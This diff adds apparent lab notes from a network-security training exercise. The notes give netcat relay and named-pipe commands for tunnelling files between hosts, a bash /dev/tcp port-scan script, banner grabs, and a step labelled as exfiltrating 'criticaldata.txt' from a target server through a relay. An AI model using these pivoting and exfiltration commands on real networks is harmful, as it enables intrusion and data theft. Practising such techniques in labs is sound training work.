@@ -1,0 +1,117 @@
+<----------TASK 1 PART 1-------->
+T1
+Hostname: INTERNET_HOST
+IP: 10.10.0.40
+
+T2
+Hostname: BLUE_HOST-1
+IP: 172.16.82.106
+
+RELAY
+Hostname: BLUE_INT_DMZ_HOST-1
+IP: 172.16.40.10
+---------------------------------------
+###(No outbound connections are to be made from RELAY)###
+Step 1:
+#On Relay
+nc -lp 7770 0< mypipe | nc -lp 7771 1> mypipe
+
+Step 2:
+#On T1 (Sender)
+nc 172.16.40.10 7770 < secretstuff.txt
+
+Step 3:
+#On T2 (Reciever)
+nc 172.16.40.10 7771 > secretstuff.txt
+------------------------------------------
+###(Only outbound connections are to be made from RELAY)###
+Step 1:
+#On Relay
+mkfifo mypipe
+nc 10.10.0.40 7770 0< mypipe | nc 172.16.82.106 7771 1> mypipe
+
+Step 2:
+#On T1 (Sender)
+nc -lp 7770 < supersecretstuff.txt
+
+Step 3:
+#On T2 (Reviever)
+nc -lp 7771 > supersecretstuff.txt
+------------------------------------------
+###(Only outbound connection can be made from T1 && No outbound connections are to be made from T2)###
+Step 1:
+#On Relay
+nc -lp 7770 0< mypipe | nc 172.16.82.106 7771 1> mypipe
+
+Step 2:
+#On T1 (Sender)
+nc 172.16.40.10 7770 < secretsquirrelstuff.txt
+
+Step 3:
+#On T2 (Reciever)
+nc -lp 7771 > secretsquirrelstuff.txt
+====================================================
+<----------TASK 1 PART 2-------->
+T1
+Hostname: INTERNET_HOST
+IP: 10.10.0.40
+
+T2 (Critical Data Server)
+Hostname: John
+IP: 10.0.0.102
+Ports: 
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+9007/tcp
+
+RELAY (Critical Data)
+Hostname: Mike
+IP: 10.50.23.175
+-----------------------------------
+Step 1:
+#ssh to host that is within the targets network (mike in this challenge)
+
+Step 2:
+#Run the nc scan below from mike(relay) to id open ports on target
+#---(./fulldevtcpscan contents)---
+#!/bin/bash
+for i in {1..65535}
+do
+        echo >/dev/tcp/10.0.0.102/$i &&
+        echo "Port $i is open" || echo "Port $i is closed"
+done
+
+./fulldevtcpscan.sh | grep open >> scan2.txt
+
+cat scan2.txt
+
+Step 3:
+#Run nc banner grab below from mike(relay) on open ports to id critical data
+nc 10.0.0.102 9007
+nc 10.0.0.102 21
+nc 10.0.0.102 22
+nc 10.0.0.102 3389
+nc 10.0.0.102 80
+
+Step 4 (Exfil the data to OpStation):
+#On Relay
+nc -lp 9007 0< mypipe | nc 10.0.0.102 9007 1> mypipe
+
+Step 5:
+#On T1 (Reciever)
+nc 10.50.23.175 9007 > criticaldata.txt
+
+NOTE:
+#On T2 (Sender)Netcat is not needed because to host is aready listening on the port of interest
+====================================================
+
+
+
+
+
+
+
+
+
